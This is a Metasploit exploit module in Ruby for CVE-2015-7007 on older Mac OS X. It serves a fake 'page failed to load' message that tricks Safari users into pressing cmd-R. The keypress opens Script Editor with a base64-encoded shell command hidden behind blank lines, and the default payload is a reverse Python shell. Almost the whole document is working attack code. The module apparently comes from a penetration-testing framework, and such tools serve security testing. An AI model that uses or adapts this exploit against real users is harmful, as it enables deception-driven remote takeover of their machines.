# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking
 
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::BrowserExploitServer
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Safari User-Assisted Applescript Exec Attack&#039;,
      &#039;Description&#039;    => %q{
        In versions of Mac OS X before 10.11.1, the applescript:// URL
        scheme is provided, which opens the provided script in the Applescript
        Editor. Pressing cmd-R in the Editor executes the code without any
        can be tricked into running arbitrary Applescript code.
 
        Gatekeeper should be disabled from Security & Privacy in order to
        avoid the unidentified Developer prompt.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Platform&#039;        => [&#039;unix&#039;, &#039;osx&#039;],
      &#039;Compat&#039;          =>
        {
          &#039;PayloadType&#039; => &#039;cmd&#039;
        },
      &#039;Targets&#039;         =>
        [
          [ &#039;Mac OS X&#039;, {} ]
        ],
      &#039;DefaultOptions&#039; => { &#039;payload&#039; => &#039;cmd/unix/reverse_python&#039; },
      &#039;DefaultTarget&#039;   => 0,
      &#039;DisclosureDate&#039;  => &#039;Oct 16 2015&#039;,
      &#039;Author&#039;          => [ &#039;joev&#039; ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-7007&#039; ],
          [ &#039;URL&#039;, &#039;https://support.apple.com/en-us/HT205375&#039; ]
        ],
      &#039;BrowserRequirements&#039; => {
        :source  => &#039;script&#039;,
        :ua_name => HttpClients::SAFARI,
        :os_name => OperatingSystems::Match::MAC_OSX
      }
    ))
 
    register_options([
      OptString.new(&#039;CONTENT&#039;, [false, "Content to display in browser",
        "This page has failed to load. Press cmd-R to refresh."]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable directory&#039;, &#039;/.Trashes&#039;])
    ], self.class)
  end
 
  def on_request_exploit(cli, request, profile)
    print_status("Sending #{self.name}")
    send_response_html(cli, exploit_html)
  end
 
  def exploit_html
    "<!doctype html><html><body>#{content}<script>#{exploit_js}</script></body></html>"
  end
 
  def exploit_js
    js_obfuscate %Q|
      var as = Array(150).join("\\n") +
        &#039;do shell script "echo #{Rex::Text.encode_base64(sh)} \| base64 --decode \| /bin/sh"&#039;;
      var url = &#039;applescript://com.apple.scripteditor?action=new&script=&#039;+encodeURIComponent(as);
      window.onkeydown = function(e) {
        if (e.keyCode == 91) {
          window.location = url;
        }
      };
    |
  end
 
  def sh
    &#039;killall "Script Editor"; nohup &#039; + payload.encoded
  end
 
  def content
    datastore[&#039;CONTENT&#039;]
  end
 
 
end

